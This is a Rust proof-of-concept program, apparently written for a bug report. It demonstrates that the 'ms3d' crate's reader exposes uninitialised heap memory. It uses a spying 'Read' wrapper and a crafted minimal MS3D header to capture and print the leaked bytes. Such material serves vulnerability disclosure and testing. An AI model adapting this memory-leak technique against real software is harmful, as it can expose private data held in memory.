#![forbid(unsafe_code)]

use ms3d::Model;
use std::{
    io::{self, Cursor, Read, Seek, SeekFrom},
    mem,
};

/// Reader that copies every byte in `buf` BEFORE real data are written.
/// If the slice is uninitialised we capture that memory.
struct Spy<R> {
    inner:  R,
    leaked: Vec<u8>,
}

impl<R: Read> Read for Spy<R> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        self.leaked.extend_from_slice(buf);          // snapshot
        self.inner.read(buf)
    }
}
impl<R: Seek> Seek for Spy<R> {
    fn seek(&mut self, pos: SeekFrom) -> io::Result<u64> { self.inner.seek(pos) }
}

fn main() {
    /* 1 ─ dirty 256 kB of heap with 0xAA, then free it */
    const CHUNK: usize = 256 * 1024;
    {
        let mut junk = vec![0xAAu8; CHUNK];
        for b in &mut junk { *b = 0xAA }
        mem::drop(junk);
    }

    /* 2 ─ minimal MS3D header: "MS3D000000" plus zeros for the rest      */
    let mut data = b"MS3D000000".to_vec();
    data.resize(512, 0);                       // enough for parser to run

    /* 3 ─ wrap the data in Spy so we can see uninitialised bytes          */
    let mut spy = Spy { inner: Cursor::new(data), leaked: Vec::new() };

    /* 4 ─ call the public API; inside, IoReader::read hits the bug        */
    let _ = Model::from_reader(&mut spy);      // we expect Err – that is fine

    /* 5 ─ display first 32 bytes captured BEFORE ms3d wrote the buffer    */
    let sample = &spy.leaked[..32.min(spy.leaked.len())];
    println!("First 32 leaked bytes: {:02x?}", sample);
}
